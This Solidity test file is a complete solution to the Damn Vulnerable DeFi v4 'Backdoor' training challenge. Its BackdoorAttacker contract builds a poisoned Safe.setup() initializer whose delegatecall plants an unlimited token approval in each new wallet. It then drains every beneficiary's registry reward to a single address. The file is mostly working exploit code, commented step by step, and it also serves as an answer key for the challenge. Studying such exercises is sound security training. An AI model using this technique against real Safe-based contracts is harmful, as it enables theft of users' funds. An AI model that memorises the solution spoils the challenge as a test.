// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BackdoorChallenge is Test {
    // -------------------------------------------------------------------------
    // Test actors
    // -------------------------------------------------------------------------

    address deployer = makeAddr("deployer");  // Deploys all contracts
    address player   = makeAddr("player");    // Must solve the challenge in ONE tx
    address recovery = makeAddr("recovery"); // Must end up holding all 40 DVT

    // Four legitimate beneficiaries — each expects to receive 10 DVT
    // after deploying their own Safe wallet through the registry.
    address[] users = [
        makeAddr("alice"),
        makeAddr("bob"),
        makeAddr("charlie"),
        makeAddr("david")
    ];

    // Total reward tokens pre-loaded into the registry (4 users × 10 DVT).
    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    // -------------------------------------------------------------------------
    // Protocol contracts (set up by deployer)
    // -------------------------------------------------------------------------

    DamnValuableToken token;          // ERC-20 reward token (DVT)
    Safe              singletonCopy;  // Canonical Safe implementation (master copy)
    SafeProxyFactory  walletFactory;  // Creates Safe proxies via createProxyWithCallback
    WalletRegistry    walletRegistry; // Grants 10 DVT to qualifying new Safe wallets

    // -------------------------------------------------------------------------
    // Modifier: wraps the player's solution in startPrank / stopPrank,
    // then asserts the success conditions.
    // -------------------------------------------------------------------------
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // -------------------------------------------------------------------------
    // Setup — DO NOT TOUCH
    // -------------------------------------------------------------------------

    /**
     * @dev Deploys the full protocol as the deployer, then funds the registry.
     *      Called automatically by Forge before each test function.
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy the Safe singleton (implementation) and its proxy factory.
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy the reward token (mints all supply to deployer).
        token = new DamnValuableToken();

        // Deploy the registry, registering the four users as beneficiaries.
        walletRegistry = new WalletRegistry(
            address(singletonCopy),
            address(walletFactory),
            address(token),
            users
        );

        // Fund the registry so it can pay out rewards.
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    // -------------------------------------------------------------------------
    // Initial-state assertions — DO NOT TOUCH
    // -------------------------------------------------------------------------

    /**
     * @dev Sanity-checks the deployment:
     *      - Registry is owned by deployer.
     *      - Registry holds exactly 40 DVT.
     *      - All four users are beneficiaries.
     *      - Non-owners cannot add beneficiaries (Unauthorized revert).
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);

        for (uint256 i = 0; i < users.length; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // Confirm access control: Unauthorized() = bytes4(hex"82b42900")
            vm.expectRevert(bytes4(hex"82b42900"));
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    // -------------------------------------------------------------------------
    // Challenge solution — player deploys BackdoorAttacker in one transaction
    // -------------------------------------------------------------------------

    /**
     * @dev Entry point for the player's solution.
     *
     *      The core vulnerability being exploited:
     *      ----------------------------------------
     *      Safe.setup() accepts an optional (to, data) pair that triggers a
     *      DELEGATECALL on the newly created wallet *during initialisation*.
     *      The WalletRegistry only inspects the wallet's state *after* setup
     *      completes (owners, threshold, fallbackManager), but it never
     *      validates the `to` / `data` fields inside the initializer calldata.
     *
     *      Exploit flow (once per beneficiary):
     *        1. Craft a Safe.setup() initializer that names the legitimate user
     *           as the sole owner (passes the registry's beneficiary check)
     *           BUT embeds a delegatecall to BackdoorAttacker.approveToken(),
     *           which runs inside the wallet's context and grants the attacker
     *           an unlimited ERC-20 allowance.
     *        2. Deploy the proxy via createProxyWithCallback → proxyCreated()
     *           fires, all registry checks pass, 10 DVT land in the new wallet.
     *        3. Call token.transferFrom(wallet → recovery) using the allowance
     *           obtained in step 1.
     *
     *      Net result: all 40 DVT end up in `recovery`, player used one tx.
     */
    function test_backdoor() public checkSolvedByPlayer {
        BackdoorAttacker attacker = new BackdoorAttacker(
            address(walletFactory),
            payable(address(singletonCopy)),
            address(walletRegistry),
            address(token),
            recovery
        );

        attacker.attack(users);
    }

    // -------------------------------------------------------------------------
    // Success conditions — DO NOT TOUCH
    // -------------------------------------------------------------------------

    /**
     * @dev Called after the player's prank ends. Asserts:
     *      - Player used exactly 1 nonce (= exactly 1 transaction).
     *      - Every user now has a registered wallet (proxyCreated ran for each).
     *      - No user remains a beneficiary (each flag was cleared by the registry).
     *      - The recovery address holds all 40 DVT.
     */
    function _isSolved() private view {
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);
            assertTrue(wallet != address(0), "User didn't register a wallet");
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

// =============================================================================
// BackdoorAttacker
// =============================================================================

/**
 * @title  BackdoorAttacker
 * @notice Exploits the WalletRegistry by abusing Safe's delegatecall-during-setup
 *         to inject a token approval before the reward is even paid out.
 *
 * @dev    Deployed by the player in a single transaction.
 *         attack() loops over all beneficiaries; for each one it:
 *           1. Builds a poisoned Safe.setup() initializer.
 *           2. Deploys the Safe proxy (triggering proxyCreated and the 10 DVT reward).
 *           3. Drains the wallet using the pre-planted allowance.
 */
contract BackdoorAttacker {

    // Protocol references stored during construction.
    SafeProxyFactory  factory;   // Used to deploy each Safe proxy
    Safe              singleton; // Passed as the implementation to the factory
    WalletRegistry    registry;  // Passed as the callback; pays out DVT rewards
    DamnValuableToken token;     // DVT token being drained
    address           recovery;  // Destination for all stolen tokens

    constructor(
        address        _factory,
        address payable _singleton,
        address        _registry,
        address        _token,
        address        _recovery
    ) {
        factory  = SafeProxyFactory(_factory);
        singleton = Safe(_singleton);
        registry = WalletRegistry(_registry);
        token    = DamnValuableToken(_token);
        recovery = _recovery;
    }

    // -------------------------------------------------------------------------
    // Core exploit loop
    // -------------------------------------------------------------------------

    /**
     * @notice Iterates over every beneficiary address and drains their registry
     *         reward to `recovery`.
     *
     * @dev    For each user the sequence is:
     *
     *         ┌─────────────────────────────────────────────────────────────┐
     *         │  1. Build owners array  [user]  (passes registry check)     │
     *         │                                                             │
     *         │  2. Encode Safe.setup() with:                               │
     *         │       owners    = [user]          ← legitimate owner        │
     *         │       threshold = 1               ← passes registry check   │
     *         │       to       = address(this)    ← delegatecall target     │
     *         │       data     = approveToken(…)  ← BACKDOOR payload        │
     *         │       fallback = address(0)        ← passes registry check  │
     *         │                                                             │
     *         │  3. createProxyWithCallback → Safe is deployed →            │
     *         │     Safe.setup() runs → delegatecall hits approveToken()    │
     *         │     inside the wallet's storage context →                   │
     *         │     token.approve(attacker, max) is recorded on the wallet  │
     *         │                                                             │
     *         │  4. proxyCreated() fires (called by factory) →              │
     *         │     registry validates owners/threshold/fallback (all OK) → │
     *         │     10 DVT transferred to the new wallet                    │
     *         │                                                             │
     *         │  5. transferFrom(wallet → recovery, 10 DVT) uses the        │
     *         │     allowance planted in step 3                             │
     *         └─────────────────────────────────────────────────────────────┘
     *
     * @param users Array of beneficiary addresses (alice, bob, charlie, david).
     */
    function attack(address[] memory users) external {
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];

            // Step 1 — build a single-owner array pointing to the legitimate user.
            //          The registry requires exactly one owner who is a beneficiary,
            //          so we must keep the real user here.
            address[] memory owners = new address[](1);
            owners[0] = user;

            // Step 2 — craft the poisoned Safe.setup() initializer.
            //
            // Safe.setup() signature (simplified):
            //   setup(
            //     address[] _owners,        // wallet owners
            //     uint256   _threshold,     // sig threshold
            //     address   to,             // optional delegatecall target  ← EXPLOIT
            //     bytes     data,           // calldata for that delegatecall ← EXPLOIT
            //     address   fallbackHandler,// fallback manager (must be 0 for registry)
            //     address   paymentToken,   // unused here
            //     uint256   payment,        // unused here
            //     address   paymentReceiver // unused here
            //   )
            //
            // The registry never inspects `to` or `data`, only:
            //   • owners (length == 1, owner is beneficiary)  ✓
            //   • threshold (== 1)                            ✓
            //   • fallbackHandler (== address(0))             ✓
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                1,               // threshold = 1  (required by registry)
                address(this),   // `to`   — delegatecall into this contract
                abi.encodeWithSignature(
                    "approveToken(address,address)",
                    address(token),
                    address(this) // grant unlimited allowance to this attacker contract
                ),               // `data` — payload for the delegatecall
                address(0),      // fallbackHandler = 0  (required by registry)
                address(0),      // paymentToken  — unused
                0,               // payment       — unused
                payable(address(0)) // paymentReceiver — unused
            );

            // Step 3 & 4 — deploy the Safe proxy.
            //   • The factory calls Safe.setup() → our delegatecall fires inside
            //     the wallet, running approveToken() in the wallet's storage context.
            //   • After deployment the factory calls registry.proxyCreated(),
            //     which validates the wallet and transfers 10 DVT to it.
            SafeProxy proxy = factory.createProxyWithCallback(
                address(singleton), // implementation
                initializer,        // poisoned setup calldata
                0,                  // salt nonce (0 is fine; we don't need determinism)
                registry            // callback: triggers proxyCreated() → 10 DVT reward
            );

            // Step 5 — drain the 10 DVT that just landed in the wallet.
            //   The wallet's token.allowance(wallet, address(this)) == type(uint256).max
            //   because approveToken() ran as a delegatecall inside the wallet in step 3.
            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }

    // -------------------------------------------------------------------------
    // Backdoor payload
    // -------------------------------------------------------------------------

    /**
     * @notice Grants an unlimited ERC-20 allowance to `spender`.
     *
     * @dev    CRITICAL: this function is called via DELEGATECALL from inside a
     *         newly created Safe wallet during Safe.setup(). That means:
     *           - msg.sender = the Safe proxy address (the wallet itself)
     *           - address(this) in storage context = the Safe proxy
     *         So `IERC20(tokenAddr).approve(spender, max)` is executed AS the
     *         wallet, recording the allowance in the token's own storage under
     *         the wallet's address. This happens BEFORE the registry even pays
     *         out the reward, yet the allowance persists afterward.
     *
     *         The WalletRegistry never checks token allowances, so this side-
     *         effect is completely invisible to its validation logic.
     *
     * @param tokenAddr  Address of the ERC-20 token to approve.
     * @param spender    Address that receives the unlimited allowance (this contract).
     */
    function approveToken(address tokenAddr, address spender) external {
        IERC20(tokenAddr).approve(spender, type(uint256).max);
    }
}
